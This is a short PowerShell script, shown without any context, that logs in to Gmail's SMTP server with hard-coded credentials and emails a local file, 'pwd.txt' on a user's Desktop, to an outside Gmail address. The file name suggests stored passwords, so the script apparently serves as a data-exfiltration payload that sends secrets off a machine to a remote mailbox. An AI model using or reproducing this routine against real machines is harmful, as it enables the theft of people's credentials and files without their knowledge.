$Message = new-object Net.Mail.MailMessage 
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587) 
$smtp.Credentials = New-Object System.Net.NetworkCredential("testsubhransu00@gmail.com", "password"); 
$smtp.EnableSsl = $true   
$Message.From = "testsubhransu00@gmail.com" 
$Message.To.Add("sendsubhransu@gmail.com") 
$Message.Attachments.Add("C:\Users\Choud\Desktop\pwd.txt")
$smtp.Send($Message)
